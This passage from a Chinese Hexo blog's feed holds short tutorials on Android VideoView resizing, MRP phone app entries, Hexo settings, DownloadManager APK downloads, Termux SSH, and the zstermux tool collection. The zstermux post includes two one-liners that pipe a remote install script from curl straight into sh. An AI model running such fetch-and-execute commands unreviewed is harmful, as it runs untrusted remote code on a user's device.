        <content type="html"><![CDATA[<p>用VideoView来播放视频时并不能自由的在xml中调整控件大小，在网上找到了这个解决办法，记录一下  </p><a id="more"></a>  <p>自定义CustomVideoView继承自系统VideoView，通过resizeVideo()方法调整视频大小  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.content.*;</span><br><span class="line"><span class="keyword">import</span> android.util.*;</span><br><span class="line"><span class="keyword">import</span> android.widget.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomVideoView</span> <span class="keyword">extends</span> <span class="title">VideoView</span> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">int</span> _overrideWidth = <span class="number">480</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">int</span> _overrideHeight = <span class="number">360</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">CustomVideoView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>(context);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">CustomVideoView</span><span class="params">(Context context, AttributeSet set)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>(context, set);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">resizeVideo</span><span class="params">(<span class="keyword">int</span> width, <span class="keyword">int</span> height)</span> </span>&#123;</span><br><span class="line">  _overrideHeight = height;</span><br><span class="line">  _overrideWidth = width;</span><br><span class="line">  <span class="comment">// not sure whether it is useful or not but safe to do so</span></span><br><span class="line">  getHolder().setFixedSize(width, height);</span><br><span class="line">  <span class="comment">//getHolder().setSizeFromLayout();</span></span><br><span class="line">  requestLayout();</span><br><span class="line">  invalidate(); <span class="comment">// very important, so that onMeasure will be triggered</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMeasure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span> </span>&#123;</span><br><span class="line">  setMeasuredDimension(_overrideWidth, _overrideHeight);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>方法转载自<a href="https://www.it1352.com/162156.html" target="_blank" rel="noopener">VideoView内容调整大小 - IT屋-程序员软件开发技术分享社区</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MRP平台应用入口</title>
      <link href="/2021/mrp-ping-tai-ying-yong-ru-kou/"/>
      <url>/2021/mrp-ping-tai-ying-yong-ru-kou/</url>
      
        <content type="html"><![CDATA[<ul><li>早期完整vm入口applist</li><li>晚期精简vm入口（cookie）曲奇</li><li>键盘指令入口（*#220807#）  <a id="more"></a>  <h4 id="applist入口"><a href="#applist入口" class="headerlink" title="applist入口"></a>applist入口</h4>早期完整vm的主入口，启动本地UI的软件列表，软件储存在目录games240x320<br>还有其他入口，飞信（目录fetion240x320)、MSN（msn240x320）、QQ2008（qqlist8240x320）</li></ul><p>早期的mrp手机是完整vm（vm版本号19开头），支持mythroad语言和c语言制作的mrp程序，部分手机还提供了nes模拟器接口</p><p>子入口一般只提供启动/设置/更新选项，可以手动添加更多软件入口<br>在子入口目录添加 <code>applist.mrp</code> 文件，可以在子入口添加更多软件列表，可以索引当前目录所有软件</p><p>applist.mrp下载：<a href="official/applist.mrp">官方版</a> | <a href="applist.mrp">民间版</a></p><h4 id="曲奇入口"><a href="#曲奇入口" class="headerlink" title="曲奇入口"></a>曲奇入口</h4><p>后期精简vm主入口，启动冒泡曲奇，软件储存在app240320<br>还有其他入口，常见的飞信/MSN，还有天气/给力猫/疯狂的小鸟等应用入口，软件目录都是app240320，并没有使用其他目录</p><p>后期功能机QQ多为腾讯自家tmc平台的QQ</p><p>后期mrp手机多为精简vm（vm版本号20开头），仅支持c语音制作的mrp程序</p><p>子入口和完整vm一样，只提供启动/设置/更新/选项，也可以像完整vm入口一样添加更多软件入口</p><ul><li><p>方法一：添加更多软件入口<br>将local.seg文件放到 <code>app240320</code> 目录中 <code>2</code> 开头的文件夹内，即可在入口里添加本地软件入口</p></li><li><p>方法二：替换曲奇入口<br>可以将 <code>应用列表</code> 程序应用id/内部名改为曲奇的信息，替换官方曲奇文件，官方曲奇在 <code>plugin240320</code> 目录，文件名 <code>cookie.mrp</code>   </p></li></ul><p>方法一本地应用列表依赖官方曲奇提供，需要配合官方曲奇+local.seg同时使用，方法二使用后会将所有入口都替换为修改信息的应用列表，方法一与方法二不可共存，使用方法一需要保证 <code>plugin240320/cookie.mrp</code> 文件为官方曲奇</p><p>部分完整vm的手机也会使用曲奇+local.seg的入口</p><p>相关文件下载：<a href="official/cookie.mrp">官方曲奇</a> | <a href="local.seg">local.seg</a> | <a href="cookie.mrp">修改为曲奇信息的应用列表</a>  </p><h4 id="键盘指令入口"><a href="#键盘指令入口" class="headerlink" title="键盘指令入口"></a>键盘指令入口</h4><p>精简vm和完整vm都存在键盘指令入口，但部分手机会屏蔽键盘指令，并非所有手机都支持</p><p>手机在拨号界面按下 <code>*#220807#</code> ，可以打开应用列表或者跳转浏览器便是支持键盘指令，可以将想要启动的mrp文件命名为 <code>dsm_gm.mrp</code> ，放到 <code>mythroad</code> 目录即可用键盘指令启动</p><p>后期精简vm仅支持220807启动冒泡曲奇， <code>应用列表8.0</code> 可以作为dsm_gm在精简vm的手机上启动，可以在 <a href="https://jq.qq.com/?_wv=1027&k=D7ywvKfo" target="_blank" rel="noopener">QQ群1035494515</a> 获取到文件  </p><p>也可以直接使用上面改为曲奇信息的列表文件  </p><p><strong>查看手机信息</strong> </p><p>早期的指令是 <code>*#777755999#</code> 后期改为 <code>*#666622444#</code> ，这条指令并无特殊作用，可以展示工厂信息/设备信息</p><p>可以使用指令 <code>*#63342835#</code> 检查手机是否为联发科（MediaTek，MTK）手机</p>]]></content>
      
      
      
        <tags>
            
            <tag> mtk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo禁用文章评论</title>
      <link href="/2021/hexo-jin-yong-wen-zhang-ping-lun/"/>
      <url>/2021/hexo-jin-yong-wen-zhang-ping-lun/</url>
      
        <content type="html"><![CDATA[<p>在md文件标题处添加 <code>comments: false</code> </p><a id="more"></a>  <p>例：  </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">date:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">tags:</span> </span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android利用DownloadManager实现文件下载</title>
      <link href="/2021/android-li-yong-downloadmanager-shi-xian-wen-jian-xia-zai/"/>
      <url>/2021/android-li-yong-downloadmanager-shi-xian-wen-jian-xia-zai/</url>
      
        <content type="html"><![CDATA[<p>调用系统下载管理下载文件，安卓API 9以后系统提供  </p><a id="more"></a>  <p>定义一个成功接口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public<span class="built_in"> interface </span>IDownloadlister &#123;</span><br><span class="line">    void success(Uri uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下载工具类</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Petterp</span></span><br><span class="line"><span class="comment"> * on 2019-10-26</span></span><br><span class="line"><span class="comment"> * Function: 文件下载工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadUtils</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">download</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        IntentFilter filter = <span class="keyword">new</span> IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE);</span><br><span class="line">        <span class="comment">//创建下载任务，url即任务链接</span></span><br><span class="line">        DownloadManager.Request request = <span class="keyword">new</span> DownloadManager.Request(Uri.parse(url));</span><br><span class="line">        <span class="comment">//指定下载路径及文件名</span></span><br><span class="line">        request.setDestinationInExternalPublicDir(FILE_URI, fileName);</span><br><span class="line">        <span class="comment">//获取下载管理器</span></span><br><span class="line">        <span class="keyword">final</span> DownloadManager downloadManager = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);</span><br><span class="line">        <span class="comment">//一些配置</span></span><br><span class="line">        <span class="comment">//允许移动网络与WIFI下载</span></span><br><span class="line">        request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_MOBILE | DownloadManager.Request.NETWORK_WIFI);</span><br><span class="line">        <span class="comment">//是否在通知栏显示下载进度</span></span><br><span class="line">        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置可见及可管理</span></span><br><span class="line">        <span class="comment">/*注意，Android Q之后不推荐使用*/</span></span><br><span class="line">        request.setVisibleInDownloadsUi(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将任务加入下载队列</span></span><br><span class="line">        assert downloadManager != null;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> id = downloadManager.enqueue(request);</span><br><span class="line">        BroadcastReceiver receiver = <span class="keyword">new</span> BroadcastReceiver() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="built_in">onReceive</span>(Context context, Intent intent) &#123;</span><br><span class="line">                <span class="comment">//获取下载id</span></span><br><span class="line">                <span class="keyword">long</span> myDwonloadID = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, <span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">if</span> (myDwonloadID == id) &#123;</span><br><span class="line">                    <span class="comment">//获取下载uri</span></span><br><span class="line">                    Uri uri = downloadManager.getUriForDownloadedFile(myDwonloadID);</span><br><span class="line">                    lister.success(uri);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (context instanceof Activity) &#123;</span><br><span class="line">            Activity activity = (Activity) context;</span><br><span class="line">            activity.registerReceiver(receiver, filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//测试url，下载链接</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> url = <span class="string">"http://qn.yingyonghui.com/apk/653732"</span> +</span><br><span class="line">            <span class="string">"5/c1d876442e38f2555"</span> +</span><br><span class="line">            <span class="string">"d85c55a1d8e95b7?sign=a36530f5c08ffbb5d9e"</span> +</span><br><span class="line">            <span class="string">"53c2d50346eb7&amp;t=5db45f8d&amp;attname=c1d876442e"</span> +</span><br><span class="line">            <span class="string">"38f2555d85c55a1d8e95b7.apk"</span>;</span><br><span class="line">    <span class="comment">//加.好处是默认隐藏路径</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">String</span> FILE_URI = <span class="string">"/.测试路径/"</span>;</span><br><span class="line">    <span class="keyword">private</span> IDownloadlister lister = null;</span><br><span class="line">  <span class="comment">//文件名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> fileName = <span class="string">"test"</span>;</span><br><span class="line">  <span class="comment">//Context</span></span><br><span class="line">    <span class="keyword">private</span> Context context;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DownloadUtils <span class="title">builder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DownloadUtils();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DownloadUtils <span class="title">setUrl</span><span class="params">(<span class="keyword">String</span> url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DownloadUtils <span class="title">setLister</span><span class="params">(IDownloadlister lister)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.lister = lister;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DownloadUtils <span class="title">setFileName</span><span class="params">(<span class="keyword">String</span> fileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.fileName = fileName;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DownloadUtils <span class="title">setContext</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.context = context;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码使用</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">DownloadUtils</span>.</span></span>builder<span class="literal">()</span></span><br><span class="line">        .set<span class="constructor">Context(<span class="params">this</span>)</span></span><br><span class="line">        .set<span class="constructor">Lister(<span class="params">new</span> IDownloadlister()</span> &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void success(Uri uri) &#123;</span><br><span class="line">               </span><br><span class="line">                Intent install = <span class="keyword">new</span> <span class="constructor">Intent(Intent.ACTION_VIEW)</span>;</span><br><span class="line">                install.set<span class="constructor">DataAndType(<span class="params">uri</span>, <span class="string">"application/vnd.android.package-archive"</span>)</span>;</span><br><span class="line">                install.add<span class="constructor">Flags(Intent.FLAG_ACTIVITY_NEW_TASK)</span>;</span><br><span class="line">                start<span class="constructor">Activity(<span class="params">install</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .download<span class="literal">()</span>;</span><br></pre></td></tr></table></figure><p>使用时，需要获取网络权限和储存空间权限  </p><blockquote><p>转载自<a href="https://blog.csdn.net/petterp/article/details/102762261" target="_blank" rel="noopener">Android利用DownloadManager实现文件下载 - petterp</a></p></blockquote><p><strong>FILE_URI</strong> 使用的目录以内置储存空间为根目录，可直接使用系统下载目录</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">String FILE_URI</span> = <span class="string">"Download"</span>;</span><br></pre></td></tr></table></figure><p>安卓Q之前可以自定义任意储存空间的文件夹作为下载文件夹使用，Q及之后只能使用安卓存在的公共文件夹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>zstermux功能拓展</title>
      <link href="/2021/zstermux-tool/"/>
      <url>/2021/zstermux-tool/</url>
      
        <content type="html"><![CDATA[<p>一个termux一键脚本，安装运行各种好玩的，UnblockNeteaseMusic解锁云音乐代理，常用视频下载工具youtub-dl，和annie，常用磁力种子下载工具cloud-torrent，aria2，还有终端配色，修改恢复更多按键。Adguard dns服务。局域网文件共享，chfs和kodexplorer。以及lnmp建站环境的安装[旧版termux可能无法使用]。  </p><a id="more"></a>  <p><strong>需要什么就安装运行什么，不会全部安装。</strong></p><blockquote><p>上面信息来自zstermux项目的README</p></blockquote><p>对原项目里的脚本进行了些小修改，将github链接替换到github下载加速链接，移除京东脚本</p><h4 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h4><p>旧版的termux可能curl都没有安装，先安装一下即可</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg <span class="keyword">install</span> curl -y</span><br></pre></td></tr></table></figure><p>下载运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://gddhy.net/2021/zstermux-tool/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>后续运行脚本</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sh</span> zs.<span class="keyword">sh</span></span><br><span class="line">或者</span><br><span class="line">./zs.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>也可以直接使用原项目的安装脚本（需要能直接访问github</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/zsxwz/zstermux/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><blockquote><p>脚本来自<a href="https://github.com/zsxwz/zstermux" target="_blank" rel="noopener">zsxwz/zstermux</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yilia添加标签云</title>
      <link href="/2021/yilia-tian-jia-biao-qian-yun/"/>
      <url>/2021/yilia-tian-jia-biao-qian-yun/</url>
      
        <content type="html"><![CDATA[<p>Yilia主题并没有单独的标签页，而是留在了侧栏，单独为Yilia添加一个标签云的页面  </p><a id="more"></a>  <p>在博客目录安装标签云程序</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-tag-<span class="symbol">cloud@</span>^<span class="number">2.0</span>.* --save</span><br></pre></td></tr></table></figure><p>在主题目录 <code>themes/yilia/layout/</code> 创建 <code>tags-could.ejs</code> 文件，粘贴以下代码</p><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby"> <span class="keyword">if</span> (site.tags.length) &#123; </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"&lt;%-</span></span></span><span class="ruby"> url_for(<span class="string">'/js/tagcloud.js'</span>) </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"&lt;%-</span></span></span><span class="ruby"> url_for(<span class="string">'/js/tagcanvas.js'</span>) </span><span class="xml"><span class="tag"><span class="string">%&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"archives-wrap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"widget-wrap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">"article-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"article-title"</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span></span></span><span class="ruby"> _<span class="number">_</span>(<span class="string">'tagcloud'</span>) </span><span class="xml"><span class="tag">%&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myCanvasContainer"</span> <span class="attr">class</span>=<span class="string">"widget tagcloud"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"250"</span> <span class="attr">id</span>=<span class="string">"resCanvas"</span> <span class="attr">style</span>=<span class="string">"width:100%"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby"> tagcloud() </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby"> &#125; </span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure><p>标签云自定义，在博客根目录 <code>_config.yml</code> 文件添加</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-tag-cloud</span></span><br><span class="line"><span class="attr">tag_cloud:</span></span><br><span class="line">    <span class="attr">textFont:</span> <span class="string">Trebuchet</span> <span class="string">MS,</span> <span class="string">Helvetica</span></span><br><span class="line">    <span class="attr">textColor:</span> <span class="string">'#333'</span></span><br><span class="line">    <span class="attr">textHeight:</span> <span class="number">25</span></span><br><span class="line">    <span class="attr">outlineColor:</span> <span class="string">'#E2E1D1'</span></span><br><span class="line">    <span class="attr">maxSpeed:</span> <span class="number">0.5</span></span><br><span class="line">    <span class="attr">pauseOnSelected:</span> <span class="literal">false</span> <span class="comment"># true 意味着当选中对应 tag 时,停止转动</span></span><br></pre></td></tr></table></figure><p>创建一个新的标签页</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new<span class="built_in"> page </span><span class="string">"tags"</span></span><br></pre></td></tr></table></figure><p>修改 <code>tags/index.md</code> 内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签云</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"tags"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"tags-could"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>现在就可以本地预览查看效果了</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean <span class="variable">&amp;&amp;</span> hexo g <span class="variable">&amp;&amp;</span> hexo s</span><br></pre></td></tr></table></figure><p><a href="/tags">查看当前博客的标签云</a></p><blockquote><p>标签云项目<a href="https://github.com/D0n9X1n/hexo-tag-cloud" target="_blank" rel="noopener">D0n9X1n/hexo-tag-cloud</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>termux开启ssh</title>
      <link href="/2021/termux-kai-qi-ssh/"/>
      <url>/2021/termux-kai-qi-ssh/</url>
      
        <content type="html"><![CDATA[<p>在<a href="https://f-droid.org/zh_Hans/packages/com.termux/" target="_blank" rel="noopener">termux</a>里开启ssh，可以方便的让其他设备连接使用  </p><a id="more"></a>  <p>安装openssh</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg <span class="keyword">install</span> openssh</span><br></pre></td></tr></table></figure><p>设置当前用户的密码，输入密码时并不会显示，需要输入两次密码回车确认</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span></span><br></pre></td></tr></table></figure><p>查看当前用户名</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">whoami</span></span><br></pre></td></tr></table></figure><p>启动ssh，termux的默认ssh端口在 8022</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sshd</span></span><br></pre></td></tr></table></figure><p>如果需要在termux启动时自动打开ssh</p><p>看一下termux用的是bash还是zsh，在里面添加 <code>sshd</code> 即可</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"sshd"</span> &gt;&gt; ~<span class="string">/.bashrc</span></span><br></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"sshd"</span> &gt;&gt; ~<span class="string">/.zshrc</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
